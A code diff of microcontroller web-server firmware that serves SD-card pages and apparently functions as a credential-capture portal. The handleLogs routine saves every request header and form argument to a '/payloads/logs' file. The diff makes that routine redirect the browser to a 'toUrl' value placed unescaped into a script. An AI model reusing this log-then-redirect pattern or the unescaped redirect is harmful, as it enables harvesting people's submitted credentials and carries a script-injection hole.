@@ -129,6 +129,7 @@ bool handleFileUpload() {
 }
 
 void handleLogs() {
+  String toUrl = shell.arg("toUrl"); 
   String logs = "--------------------\n"; 
   for (int i = 0; i < shell.headers(); i++) {
     logs += shell.headerName(i) + ": " + shell.header(i) + "\n"; 
@@ -137,11 +138,14 @@ void handleLogs() {
   for (int i = 0; i < shell.args(); i++) {
     logs += shell.argName(i) + ": " + shell.arg(i) + "\n"; 
   }
-  logs += "\n"; 
   File logFile = SD.open("/payloads/logs", FILE_WRITE); 
   logFile.println(logs); 
   logFile.close(); 
-  shell.send(200); 
+  if (toUrl) {
+    shell.send(200, "text/html", "<script>window.location.replace(\"" + toUrl + "\")</script>"); 
+  } else {
+    shell.send(200); 
+  }
 }
 
 // need to be modified to fit your SDcard
@@ -294,12 +298,14 @@ void _rm(String filePath) {
 }
 
 void mvFile(String oFilePath, String dFilePath) {
+  String data = ""; 
   File oDataFile = SD.open(oFilePath, FILE_READ); 
-  File dDataFile = SD.open(dFilePath, FILE_WRITE); 
   for (int i = 0; i < oDataFile.size(); i++) {
-    dDataFile.print((char)oDataFile.read()); 
+    data += (char)oDataFile.read(); 
   }
   oDataFile.close(); 
+  File dDataFile = SD.open(dFilePath, FILE_WRITE); 
+  dDataFile.print(data); 
   dDataFile.close(); 
   SD.remove(oFilePath); 
 }
@@ -340,9 +346,7 @@ bool _wget(String httpUrl, String filePath, String user_fingerprint) {
       result += "HTTP/1.1 " + httpCode; 
       result += "\n"; 
       if (httpCode == HTTP_CODE_OK) {
-        String payload = httpClient.getString(); 
-        result += (payload.length() > 2000) ? payload.substring(0, 94) + "[More]" : payload; 
-        dataFile.print(payload); 
+        dataFile.print(httpClient.getString()); 
         dataFile.close(); 
       }
       httpClient.end(); 
@@ -360,14 +364,12 @@ bool _wget(String httpUrl, String filePath, String user_fingerprint) {
     httpsClient.begin(*wifiClientSSL, httpUrl); 
     int httpsCode = httpsClient.GET(); 
     String result; 
-    File dataFile = SPIFFS.open(filePath, "w"); 
+    File dataFile = SD.open(filePath, FILE_WRITE); 
     if (httpsCode > 0) {
       result += "HTTP/1.1 " + httpsCode; 
       result += "\n"; 
       if (httpsCode == HTTP_CODE_OK || httpsCode == HTTP_CODE_MOVED_PERMANENTLY) {
-        String payload = httpsClient.getString(); 
-        result += (payload.length() > 2000) ? payload.substring(0, 94) + "[More]" : payload; 
-        dataFile.print(payload); 
+        dataFile.print(httpsClient.getString()); 
         dataFile.close(); 
       }
       httpsClient.end(); 
@@ -394,7 +396,7 @@ void handler() {
   bool fileReadOK = handleFileRead(webAddress);
   // 如果在SD无法找到用户访问的资源，则回复404 (Not Found)
   if (!fileReadOK){                                                 
-    shell.send(404, "text/plain", "404 Not Found"); 
+    shell.send(404); 
   }
 }
 
